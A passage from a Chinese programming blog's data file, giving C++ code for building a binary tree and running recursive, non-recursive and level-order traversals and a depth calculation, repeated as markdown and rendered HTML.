{\n\t\tif (!(t = (BiTNode*)malloc(sizeof(BiTNode)))) {\n\t\t\texit(OVERFLOW);\n\t\t}\n\t\t//申请该节点的内存空间\n\t\t//按照先序序列创建二叉树\n\t\tt->data = c;\n\t\tcreateBiTree(t->lchild);\n\t\tcreateBiTree(t->rchild);\n\n​\t}\n​\treturn;\n}\n//先序遍历\nvoid preOrderTraverse(BiTree t) {\n​\tif (t) {\n​\t\tcout << t->data << \" \" << flush;\n​\t\tpreOrderTraverse(t->lchild);\n​\t\tpreOrderTraverse(t->rchild);\n​\t}\n}\n//中序遍历\nvoid inOrderTraverse1(BiTree t) {\n​\tif (t) {\n​\t\tinOrderTraverse1(t->lchild);\n​\t\tcout << t->data << \" \" << flush;\n​\t\tinOrderTraverse1(t->rchild);\n​\t}\n}\n//后序遍历\nvoid postOrderTraverse(BiTree t) {\n​\tif (t) {\n​\t\tpostOrderTraverse(t->lchild);\n​\t\tpostOrderTraverse(t->rchild);\n​\t\tcout << t->data << \" \" << flush;\n​\t}\n}\nint getDeep(BiTree t) {\n​\tif (t == NULL) {\n​\t\treturn 0;\n​\t}\n​\t//变成比较两个子树的深度问题,递归分解问题,最下面的时候返回1\n​\tint a = getDeep(t->lchild);\n​\tint b = getDeep(t->rchild);\n​\treturn (a > b) ? (a + 1) : (b + 1);\n}\nbool initQueue(LinkQueue& Q) {\n​\tQ.front = Q.rear = new Node;\n​\t//这个链队列是具有头结点的链队列,头结点不存数据\n​\tif (!Q.front) {\n​\t\texit(OVERFLOW);\n​\t}\n​\tQ.front->next = NULL;\n​\treturn true;\n}\nbool enQueue(LinkQueue& Q, BiTNode *treeNode) {\n​\tNode* p = (Node*)malloc(sizeof(Node));\n​\t//如果内存申请失败\n​\tif (!p) {\n​\t\texit(OVERFLOW);\n​\t}\n​\t//让p节点中的treeNode指向对应的树节点\n​\tp->treeNode =treeNode;\n​\tp->next = NULL;\n\n​\t//连接链表\n​\tQ.rear->next = p;\n\n​\t//头结点的data域为空,尾结点data域非空\n​\tQ.rear = p;\n​\treturn true;\n\n}\nvoid deQueue(LinkQueue& Q) {\n\tif (Q.front && Q.front != Q.rear) {\n\t\t//新建一个temp指针p\n\t\tNode* p = Q.front->next;\n\n​\t\tQ.front->next = p->next;\n​\t\t//判断出队的是不是最后一个节点\n​\t\t//如果不加这个判断free(p后),Q.rear->next会变为野指针\n​\t\tif (p == Q.rear) {\n​\t\t\tQ.rear = Q.front;\n​\t\t}\n​\t\tfree(p);\n​\t\n​\t}\n​\treturn;\n}\nvoid floorTraverse(LinkQueue& Q, BiTree& t) {\n\n​\tif (t != NULL) {\n​\t\tenQueue(Q, t);\n​\t}\n​\twhile (Q.front != Q.rear) {\n​\t\tcout << Q.front->next->treeNode->data <<' ' << flush;\n​\t\tif (Q.front->next->treeNode->lchild != NULL) {\n​\t\t\tenQueue(Q, Q.front->next->treeNode->lchild);\n​\t\t}\n​\t\tif (Q.front->next->treeNode->rchild != NULL) {\n​\t\t\tenQueue(Q, Q.front->next->treeNode->rchild);\n​\t\t}\n​\t\tdeQueue(Q);\n​\t}\n}\n\nvoid inOrderTraverse2(stack s,BiTree& t) {\n\n​\tBiTNode* p = t;\n​\twhile(p || !isEmpty(s)) {\n​\t\tif (p) {\n​\t\t\tpush(s, *p);\n​\t\t\tp = p->lchild;\n​\t\t}\n​\t\telse {\n​\t\t\tBiTNode e = pop(s);\n​\t\t\tcout << e.data << \" \" << flush;\n​\t\t\tp = e.rchild;\n​\t\t}\n​\t}\n​\treturn;\n}\n//栈相关函数\nvoid initStack(stack& s) {\n​\t//申请内存空间\n​\ts.base = (BiTNode*)malloc(STACK_INIT_SIZE * sizeof(BiTNode));\n​\tif (!s.base) {\n​\t\texit(OVERFLOW);\n​\t}\n​\ts.top = s.base;\n​\ts.size = STACK_INIT_SIZE;\n​\treturn;\n}\nbool isEmpty(stack& s) {\n​\tif (s.base == s.top)\n​\t\treturn true;\n​\telse\n​\t\treturn false;\n}\nvoid push(stack& s, BiTNode treeNode) {\n​\tif (s.top - s.base >= s.size) {\n​\t\ts.base = (BiTNode*)realloc(s.base, (s.size + STACKINCREMENT) * sizeof(BiTNode));\n​\t\tif (!s.base) {\n​\t\t\texit(OVERFLOW);\n​\t\t}\n​\t\ts.top = s.base + s.size;\n​\t\ts.size += STACKINCREMENT;\n​\t}\n​\t*s.top++ = treeNode;\n}\nBiTNode pop(stack& s) {\n​\tif (s.base) {\t\n​\t\tBiTNode e = (*--s.top);\n​\t\t(*s.top).data = '$';\n​\t\treturn e;\n​\t}\n}\n\n\n```\n\n","source":"_posts/二叉树遍历.md","raw":"---\ntitle: 二叉树遍历\ndate: 2021-12-04 23:11:02\ntags: \n    -cpp\n    -数据结构\n    -二叉树\ncategories: 数据结构\ntypora-root-url: ..\n\n---\n\n二叉树的前中后序递归和非递归遍历和层序遍历代码实现\n\n<!--more-->\n\n```\n#include<iostream>\n#include<stdlib.h>\nusing namespace std;\n#define STACK_INIT_SIZE 100//存储空间初始分配量\n#define STACKINCREMENT 10//存储空间分配增量\n\ntypedef struct BiTNode {\n\tchar data;\n\tstruct BiTNode* lchild, * rchild;\n}BiTNode,* BiTree;\ntypedef struct Node\n{\n\tBiTNode* treeNode;\n\tNode* next;\n}Node;\ntypedef struct LinkQueue {\n\tNode* front;\n\tNode* rear;\n\n}LinkQueue;\ntypedef struct {\n\tBiTNode* top;\n\tBiTNode* base;\n\tint size;\n\n}stack;\nvoid createBiTree(BiTree& t);\nvoid preOrderTraverse(BiTree t);\nvoid inOrderTraverse1(BiTree t);\nvoid postOrderTraverse(BiTree t);\nint getDeep(BiTree t);\nbool initQueue(LinkQueue& Q);\nbool enQueue(LinkQueue& Q, BiTNode treeNode);\nvoid deQueue(LinkQueue& Q);\nvoid floorTraverse(LinkQueue& Q, BiTree& t);\nvoid inOrderTraverse2(stack s, BiTree& t);\nvoid initStack(stack& s);\nbool isEmpty(stack& s);\nvoid push(stack& s, BiTNode treeNode);\nBiTNode pop(stack& s);\n\nint main() {\n\tBiTree t;\n\tstack s;\n\tinitStack(s);\n\tLinkQueue Q;\n\tinitQueue(Q);\n\tcreateBiTree(t);\n\tcout << \"二叉树创建完成\" << endl<<endl;\n\tcout << \"先序遍历\" << endl;\n\tpreOrderTraverse(t);\n\tcout << endl;\n\tcout << \"递归中序遍历\" <<endl;\n\tinOrderTraverse1(t);\n\tcout << endl;\n\tcout << \"非递归中序遍历\" << endl;\n\tinOrderTraverse2(s, t);\n\tcout << endl;\n\tcout << \"后序遍历\" << endl;\n\tpostOrderTraverse(t);\n\tcout << endl;\n\tcout << \"层序遍历\" << endl;\n\tfloorTraverse(Q, t);\n\tcout << endl;\n\t\n\tcout << \"二叉树的深度为\" << getDeep(t) << endl;\n\treturn 0;\n}\nvoid createBiTree(BiTree& t) {\n\tchar c;\n\tcin >> c;\n\tif (c == '$')\n\t\t//利用给先序遍历序列添加空节点保证建立二叉树的唯一性\n\t\tt = NULL;\n\telse {\n\t\tif (!(t = (BiTNode*)malloc(sizeof(BiTNode)))) {\n\t\t\texit(OVERFLOW);\n\t\t}\n\t\t//申请该节点的内存空间\n\t\t//按照先序序列创建二叉树\n\t\tt->data = c;\n\t\tcreateBiTree(t->lchild);\n\t\tcreateBiTree(t->rchild);\n\n​\t}\n​\treturn;\n}\n//先序遍历\nvoid preOrderTraverse(BiTree t) {\n​\tif (t) {\n​\t\tcout << t->data << \" \" << flush;\n​\t\tpreOrderTraverse(t->lchild);\n​\t\tpreOrderTraverse(t->rchild);\n​\t}\n}\n//中序遍历\nvoid inOrderTraverse1(BiTree t) {\n​\tif (t) {\n​\t\tinOrderTraverse1(t->lchild);\n​\t\tcout << t->data << \" \" << flush;\n​\t\tinOrderTraverse1(t->rchild);\n​\t}\n}\n//后序遍历\nvoid postOrderTraverse(BiTree t) {\n​\tif (t) {\n​\t\tpostOrderTraverse(t->lchild);\n​\t\tpostOrderTraverse(t->rchild);\n​\t\tcout << t->data << \" \" << flush;\n​\t}\n}\nint getDeep(BiTree t) {\n​\tif (t == NULL) {\n​\t\treturn 0;\n​\t}\n​\t//变成比较两个子树的深度问题,递归分解问题,最下面的时候返回1\n​\tint a = getDeep(t->lchild);\n​\tint b = getDeep(t->rchild);\n​\treturn (a > b) ? (a + 1) : (b + 1);\n}\nbool initQueue(LinkQueue& Q) {\n​\tQ.front = Q.rear = new Node;\n​\t//这个链队列是具有头结点的链队列,头结点不存数据\n​\tif (!Q.front) {\n​\t\texit(OVERFLOW);\n​\t}\n​\tQ.front->next = NULL;\n​\treturn true;\n}\nbool enQueue(LinkQueue& Q, BiTNode *treeNode) {\n​\tNode* p = (Node*)malloc(sizeof(Node));\n​\t//如果内存申请失败\n​\tif (!p) {\n​\t\texit(OVERFLOW);\n​\t}\n​\t//让p节点中的treeNode指向对应的树节点\n​\tp->treeNode =treeNode;\n​\tp->next = NULL;\n\n​\t//连接链表\n​\tQ.rear->next = p;\n\n​\t//头结点的data域为空,尾结点data域非空\n​\tQ.rear = p;\n​\treturn true;\n\n}\nvoid deQueue(LinkQueue& Q) {\n\tif (Q.front && Q.front != Q.rear) {\n\t\t//新建一个temp指针p\n\t\tNode* p = Q.front->next;\n\n​\t\tQ.front->next = p->next;\n​\t\t//判断出队的是不是最后一个节点\n​\t\t//如果不加这个判断free(p后),Q.rear->next会变为野指针\n​\t\tif (p == Q.rear) {\n​\t\t\tQ.rear = Q.front;\n​\t\t}\n​\t\tfree(p);\n​\t\n​\t}\n​\treturn;\n}\nvoid floorTraverse(LinkQueue& Q, BiTree& t) {\n\n​\tif (t != NULL) {\n​\t\tenQueue(Q, t);\n​\t}\n​\twhile (Q.front != Q.rear) {\n​\t\tcout << Q.front->next->treeNode->data <<' ' << flush;\n​\t\tif (Q.front->next->treeNode->lchild != NULL) {\n​\t\t\tenQueue(Q, Q.front->next->treeNode->lchild);\n​\t\t}\n​\t\tif (Q.front->next->treeNode->rchild != NULL) {\n​\t\t\tenQueue(Q, Q.front->next->treeNode->rchild);\n​\t\t}\n​\t\tdeQueue(Q);\n​\t}\n}\n\nvoid inOrderTraverse2(stack s,BiTree& t) {\n\n​\tBiTNode* p = t;\n​\twhile(p || !isEmpty(s)) {\n​\t\tif (p) {\n​\t\t\tpush(s, *p);\n​\t\t\tp = p->lchild;\n​\t\t}\n​\t\telse {\n​\t\t\tBiTNode e = pop(s);\n​\t\t\tcout << e.data << \" \" << flush;\n​\t\t\tp = e.rchild;\n​\t\t}\n​\t}\n​\treturn;\n}\n//栈相关函数\nvoid initStack(stack& s) {\n​\t//申请内存空间\n​\ts.base = (BiTNode*)malloc(STACK_INIT_SIZE * sizeof(BiTNode));\n​\tif (!s.base) {\n​\t\texit(OVERFLOW);\n​\t}\n​\ts.top = s.base;\n​\ts.size = STACK_INIT_SIZE;\n​\treturn;\n}\nbool isEmpty(stack& s) {\n​\tif (s.base == s.top)\n​\t\treturn true;\n​\telse\n​\t\treturn false;\n}\nvoid push(stack& s, BiTNode treeNode) {\n​\tif (s.top - s.base >= s.size) {\n​\t\ts.base = (BiTNode*)realloc(s.base, (s.size + STACKINCREMENT) * sizeof(BiTNode));\n​\t\tif (!s.base) {\n​\t\t\texit(OVERFLOW);\n​\t\t}\n​\t\ts.top = s.base + s.size;\n​\t\ts.size += STACKINCREMENT;\n​\t}\n​\t*s.top++ = treeNode;\n}\nBiTNode pop(stack& s) {\n​\tif (s.base) {\t\n​\t\tBiTNode e = (*--s.top);\n​\t\t(*s.top).data = '$';\n​\t\treturn e;\n​\t}\n}\n\n\n```\n\n","slug":"二叉树遍历","published":1,"updated":"2022-01-07T13:31:06.123Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9nc0028gsw95sg9gy1c","content":"<p>二叉树的前中后序递归和非递归遍历和层序遍历代码实现</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;iostream&gt;</span><br><span class=\"line\">#include&lt;stdlib.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#define STACK_INIT_SIZE 100//存储空间初始分配量</span><br><span class=\"line\">#define STACKINCREMENT 10//存储空间分配增量</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct BiTNode &#123;</span><br><span class=\"line\">\tchar data;</span><br><span class=\"line\">\tstruct BiTNode* lchild, * rchild;</span><br><span class=\"line\">&#125;BiTNode,* BiTree;</span><br><span class=\"line\">typedef struct Node</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tBiTNode* treeNode;</span><br><span class=\"line\">\tNode* next;</span><br><span class=\"line\">&#125;Node;</span><br><span class=\"line\">typedef struct LinkQueue &#123;</span><br><span class=\"line\">\tNode* front;</span><br><span class=\"line\">\tNode* rear;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;LinkQueue;</span><br><span class=\"line\">typedef struct &#123;</span><br><span class=\"line\">\tBiTNode* top;</span><br><span class=\"line\">\tBiTNode* base;</span><br><span class=\"line\">\tint size;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;stack;</span><br><span class=\"line\">void createBiTree(BiTree&amp; t);</span><br><span class=\"line\">void preOrderTraverse(BiTree t);</span><br><span class=\"line\">void inOrderTraverse1(BiTree t);</span><br><span class=\"line\">void postOrderTraverse(BiTree t);</span><br><span class=\"line\">int getDeep(BiTree t);</span><br><span class=\"line\">bool initQueue(LinkQueue&amp; Q);</span><br><span class=\"line\">bool enQueue(LinkQueue&amp; Q, BiTNode treeNode);</span><br><span class=\"line\">void deQueue(LinkQueue&amp; Q);</span><br><span class=\"line\">void floorTraverse(LinkQueue&amp; Q, BiTree&amp; t);</span><br><span class=\"line\">void inOrderTraverse2(stack s, BiTree&amp; t);</span><br><span class=\"line\">void initStack(stack&amp; s);</span><br><span class=\"line\">bool isEmpty(stack&amp; s);</span><br><span class=\"line\">void push(stack&amp; s, BiTNode treeNode);</span><br><span class=\"line\">BiTNode pop(stack&amp; s);</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">\tBiTree t;</span><br><span class=\"line\">\tstack s;</span><br><span class=\"line\">\tinitStack(s);</span><br><span class=\"line\">\tLinkQueue Q;</span><br><span class=\"line\">\tinitQueue(Q);</span><br><span class=\"line\">\tcreateBiTree(t);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;二叉树创建完成&quot; &lt;&lt; endl&lt;&lt;endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;先序遍历&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tpreOrderTraverse(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;递归中序遍历&quot; &lt;&lt;endl;</span><br><span class=\"line\">\tinOrderTraverse1(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;非递归中序遍历&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tinOrderTraverse2(s, t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;后序遍历&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tpostOrderTraverse(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;层序遍历&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tfloorTraverse(Q, t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tcout &lt;&lt; &quot;二叉树的深度为&quot; &lt;&lt; getDeep(t) &lt;&lt; endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void createBiTree(BiTree&amp; t) &#123;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">\tcin &gt;&gt; c;</span><br><span class=\"line\">\tif (c == &#x27;$&#x27;)</span><br><span class=\"line\">\t\t//利用给先序遍历序列添加空节点保证建立二叉树的唯一性</span><br><span class=\"line\">\t\tt = NULL;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\tif (!(t = (BiTNode*)malloc(sizeof(BiTNode)))) &#123;</span><br><span class=\"line\">\t\t\texit(OVERFLOW);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t//申请该节点的内存空间</span><br><span class=\"line\">\t\t//按照先序序列创建二叉树</span><br><span class=\"line\">\t\tt-&gt;data = c;</span><br><span class=\"line\">\t\tcreateBiTree(t-&gt;lchild);</span><br><span class=\"line\">\t\tcreateBiTree(t-&gt;rchild);</span><br><span class=\"line\"></span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\treturn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//先序遍历</span><br><span class=\"line\">void preOrderTraverse(BiTree t) &#123;</span><br><span class=\"line\">​\tif (t) &#123;</span><br><span class=\"line\">​\t\tcout &lt;&lt; t-&gt;data &lt;&lt; &quot; &quot; &lt;&lt; flush;</span><br><span class=\"line\">​\t\tpreOrderTraverse(t-&gt;lchild);</span><br><span class=\"line\">​\t\tpreOrderTraverse(t-&gt;rchild);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//中序遍历</span><br><span class=\"line\">void inOrderTraverse1(BiTree t) &#123;</span><br><span class=\"line\">​\tif (t) &#123;</span><br><span class=\"line\">​\t\tinOrderTraverse1(t-&gt;lchild);</span><br><span class=\"line\">​\t\tcout &lt;&lt; t-&gt;data &lt;&lt; &quot; &quot; &lt;&lt; flush;</span><br><span class=\"line\">​\t\tinOrderTraverse1(t-&gt;rchild);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//后序遍历</span><br><span class=\"line\">void postOrderTraverse(BiTree t) &#123;</span><br><span class=\"line\">​\tif (t) &#123;</span><br><span class=\"line\">​\t\tpostOrderTraverse(t-&gt;lchild);</span><br><span class=\"line\">​\t\tpostOrderTraverse(t-&gt;rchild);</span><br><span class=\"line\">​\t\tcout &lt;&lt; t-&gt;data &lt;&lt; &quot; &quot; &lt;&lt; flush;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int getDeep(BiTree t) &#123;</span><br><span class=\"line\">​\tif (t == NULL) &#123;</span><br><span class=\"line\">​\t\treturn 0;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\t//变成比较两个子树的深度问题,递归分解问题,最下面的时候返回1</span><br><span class=\"line\">​\tint a = getDeep(t-&gt;lchild);</span><br><span class=\"line\">​\tint b = getDeep(t-&gt;rchild);</span><br><span class=\"line\">​\treturn (a &gt; b) ? (a + 1) : (b + 1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bool initQueue(LinkQueue&amp; Q) &#123;</span><br><span class=\"line\">​\tQ.front = Q.rear = new Node;</span><br><span class=\"line\">​\t//这个链队列是具有头结点的链队列,头结点不存数据</span><br><span class=\"line\">​\tif (!Q.front) &#123;</span><br><span class=\"line\">​\t\texit(OVERFLOW);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\tQ.front-&gt;next = NULL;</span><br><span class=\"line\">​\treturn true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bool enQueue(LinkQueue&amp; Q, BiTNode *treeNode) &#123;</span><br><span class=\"line\">​\tNode* p = (Node*)malloc(sizeof(Node));</span><br><span class=\"line\">​\t//如果内存申请失败</span><br><span class=\"line\">​\tif (!p) &#123;</span><br><span class=\"line\">​\t\texit(OVERFLOW);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\t//让p节点中的treeNode指向对应的树节点</span><br><span class=\"line\">​\tp-&gt;treeNode =treeNode;</span><br><span class=\"line\">​\tp-&gt;next = NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">​\t//连接链表</span><br><span class=\"line\">​\tQ.rear-&gt;next = p;</span><br><span class=\"line\"></span><br><span class=\"line\">​\t//头结点的data域为空,尾结点data域非空</span><br><span class=\"line\">​\tQ.rear = p;</span><br><span class=\"line\">​\treturn true;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void deQueue(LinkQueue&amp; Q) &#123;</span><br><span class=\"line\">\tif (Q.front &amp;&amp; Q.front != Q.rear) &#123;</span><br><span class=\"line\">\t\t//新建一个temp指针p</span><br><span class=\"line\">\t\tNode* p = Q.front-&gt;next;</span><br><span class=\"line\"></span><br><span class=\"line\">​\t\tQ.front-&gt;next = p-&gt;next;</span><br><span class=\"line\">​\t\t//判断出队的是不是最后一个节点</span><br><span class=\"line\">​\t\t//如果不加这个判断free(p后),Q.rear-&gt;next会变为野指针</span><br><span class=\"line\">​\t\tif (p == Q.rear) &#123;</span><br><span class=\"line\">​\t\t\tQ.rear = Q.front;</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\tfree(p);</span><br><span class=\"line\">​\t</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\treturn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void floorTraverse(LinkQueue&amp; Q, BiTree&amp; t) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​\tif (t != NULL) &#123;</span><br><span class=\"line\">​\t\tenQueue(Q, t);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\twhile (Q.front != Q.rear) &#123;</span><br><span class=\"line\">​\t\tcout &lt;&lt; Q.front-&gt;next-&gt;treeNode-&gt;data &lt;&lt;&#x27; &#x27; &lt;&lt; flush;</span><br><span class=\"line\">​\t\tif (Q.front-&gt;next-&gt;treeNode-&gt;lchild != NULL) &#123;</span><br><span class=\"line\">​\t\t\tenQueue(Q, Q.front-&gt;next-&gt;treeNode-&gt;lchild);</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\tif (Q.front-&gt;next-&gt;treeNode-&gt;rchild != NULL) &#123;</span><br><span class=\"line\">​\t\t\tenQueue(Q, Q.front-&gt;next-&gt;treeNode-&gt;rchild);</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\tdeQueue(Q);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void inOrderTraverse2(stack s,BiTree&amp; t) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​\tBiTNode* p = t;</span><br><span class=\"line\">​\twhile(p || !isEmpty(s)) &#123;</span><br><span class=\"line\">​\t\tif (p) &#123;</span><br><span class=\"line\">​\t\t\tpush(s, *p);</span><br><span class=\"line\">​\t\t\tp = p-&gt;lchild;</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\telse &#123;</span><br><span class=\"line\">​\t\t\tBiTNode e = pop(s);</span><br><span class=\"line\">​\t\t\tcout &lt;&lt; e.data &lt;&lt; &quot; &quot; &lt;&lt; flush;</span><br><span class=\"line\">​\t\t\tp = e.rchild;</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\treturn;</span><br><span class=\"line\">&#125;</span><br><span 